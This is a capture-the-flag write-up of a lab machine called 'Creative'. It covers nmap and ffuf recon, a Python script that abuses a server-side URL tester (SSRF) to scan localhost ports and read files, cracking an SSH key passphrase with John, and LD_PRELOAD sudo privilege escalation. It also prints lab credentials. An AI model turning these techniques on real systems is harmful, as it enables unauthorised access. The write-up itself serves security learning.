# Creative — Write-up

## Objective

Exploit a vulnerable web application and some misconfigurations to gain root privileges.

**Questions to answer:**

- What is user.txt?
- What is root.txt?

---

## Initial Recon

```bash
nmap -sS -sV -sC 10.80.176.53
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

---

## Hitting a Wall, Then Finding a Vhost

I tried numerous XSS variations and used an XSS scanner, but nothing returned. Gobuster didn't show anything either. I couldn't find anything, so as a last straw I decided to try and find some hidden domains:

```bash
ffuf -w raft-medium-words.txt -u http://creative.thm/ -H "Host: FUZZ.creative.thm" -mc 200
```

```
beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 43ms]
```

Adding `beta.creative.thm` to my `/etc/hosts` I found the next clue! I arrived at a beta URL tester.

---

## Enumerating Localhost Ports Through the Beta Tester

I asked an AI to create a script that would enumerate each localhost port through the URL input form:

```python
#!/usr/bin/env python3
"""
Simple Localhost Port Enumerator for beta.creative.thm
"""

import requests
import concurrent.futures
import time

# Configuration
BASE_URL = "http://beta.creative.thm"
START_PORT = 1
END_PORT = 65535

def test_port(port):
    """Test if a port is open by submitting to the form"""
    url = f"http://localhost:{port}"

    try:
        # Submit the form with the port URL
        response = requests.post(
            BASE_URL,
            data={"url": url},
            timeout=3
        )

        # If response contains "Dead", port is dead
        if "Dead" in response.text or "dead" in response.text:
            return None

        # If we get a successful response without "Dead", port is open
        if response.status_code == 200:
            return port

    except:
        # Any error means port is dead or unreachable
        return None

    return None

def main():
    print("=" * 50)
    print("Simple Port Scanner for beta.creative.thm")
    print("=" * 50)

    # Get user input
    print("\nScan options:")
    print("1. Quick scan (common ports)")
    print("2. Full scan (1-65535)")
    print("3. Custom range")

    choice = input("\nChoice: ")

    ports_to_scan = []

    if choice == "1":
        # Common ports
        ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
                        3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443]
        print(f"\n[*] Scanning {len(ports_to_scan)} common ports...")

    elif choice == "2":
        ports_to_scan = list(range(1, 65536))
        print(f"\n[*] Scanning all 65535 ports... (this will take a while)")

    elif choice == "3":
        start = int(input("Start port: "))
        end = int(input("End port: "))
        ports_to_scan = list(range(start, end + 1))
        print(f"\n[*] Scanning ports {start}-{end}...")

    else:
        print("Invalid choice")
        return

    print("[*] Scanning... (only open ports will be shown)")
    print("-" * 50)

    open_ports = []
    tested = 0

    # Scan ports in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        results = executor.map(test_port, ports_to_scan)

        for result in results:
            tested += 1
            if result:
                open_ports.append(result)
                print(f"[+] Port {result} is OPEN!")

            # Show progress every 100 ports
            if tested % 100 == 0:
                print(f"[*] Progress: {tested}/{len(ports_to_scan)}", end='\r')

    print(f"\n[*] Scan complete! Tested {tested} ports")
    print("=" * 50)

    if open_ports:
        print(f"\n[+] Found {len(open_ports)} open ports:")
        print("-" * 30)
        for port in sorted(open_ports):
            print(f"  Port {port}")
    else:
        print("\n[!] No open ports found")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Scan stopped by user")
```

This gave me port `1337`. Going to:

```
http://localhost:1337/home/saad/user.txt
```

gives the first flag.

**Flag:** `9a1ce9############8630b47b8b4a84`

---

## Finding Credentials

Inside `http://localhost:1337/home/saad/.bash_history` I found saad's history:

```
whoami pwd ls -al ls cd .. sudo -l echo "saad:MyStrongestPasswordYet$4291" > creds.txt rm creds.txt sudo -l whomai whoami pwd ls -al sudo -l ls -al pwd whoami mysql -u root -p netstat -antlp mysql -u root sudo su ssh root@192.169.155.104 mysql -u user -p mysql -u db_user -p ls -ld /var/lib/mysql ls -al cat .bash_history cat .bash_logout nano .bashrc ls -al
```

Using this password for an SSH login failed — `Permission denied (publickey)`.

Inside `home/saad/.ssh/id_rsa` I found an encrypted private key. I used `ssh2john.py` to get the hash, then used John to decrypt the key:

```bash
john --wordlist=rockyou.txt test.hash
```

This recovered the key passphrase:

**Key passphrase:** `sweetness`

Finally I could SSH into the server!

---

## Privilege Escalation

To gain admin privileges I found `env_keep+=LD_PRELOAD` from `sudo -l`. I'd previously done a write-up on this exact technique:

- https://github.com/loucifer-x/Hackopedia/blob/main/Linux%20priviledge%20escalation.md

Using `/usr/bin/ping` as the binary, I abused the LD_PRELOAD environment variable being preserved through `sudo` to get root privileges, and grabbed the final flag from:

```bash
cat /root/root.txt
```

---

## Summary

- **Recon:** Nmap showed only SSH and an nginx web server redirecting to `creative.thm`. Standard XSS payloads and directory brute-forcing turned up nothing.
- **Vhost discovery:** Fuzzing the `Host` header with `ffuf` uncovered a hidden subdomain, `beta.creative.thm`, hosting a URL/beta tester tool.
- **SSRF-style port scan:** The beta tester's URL field was used as a blind port scanner against `localhost` from the server's own perspective, revealing an internal service on port `1337` that served files by path — including `user.txt` (first flag).
- **Credential hunting:** The same path-based file read exposed `saad`'s `.bash_history` (a decoy password) and an encrypted SSH private key. Cracking the key's passphrase with `ssh2john` + John the Ripper (`sweetness`) provided real SSH access.
- **Privilege escalation:** A `sudo -l` check showed `LD_PRELOAD` was preserved through `sudo`, allowing a malicious shared library to be loaded into a `sudo`-run binary (`/usr/bin/ping`) to spawn a root shell and read `root.txt`.

**Key takeaways:**

- When standard web attacks and directory brute-forcing come up empty, virtual host fuzzing is worth trying — a lot of "hidden" functionality lives on subdomains rather than paths.
- A form that fetches arbitrary URLs server-side is effectively SSRF, and can be repurposed as an internal port scanner or file reader against `localhost` and other internal services.
- Command history files (`.bash_history`) are a goldmine but can also contain red herrings — always verify a found credential actually works before assuming it's the real one.
- `sudo` preserving `LD_PRELOAD` (via `env_keep+=LD_PRELOAD`) is a well-known privilege escalation vector: any `sudo`-permitted binary can be hijacked into loading an attacker-supplied shared library that runs as root.
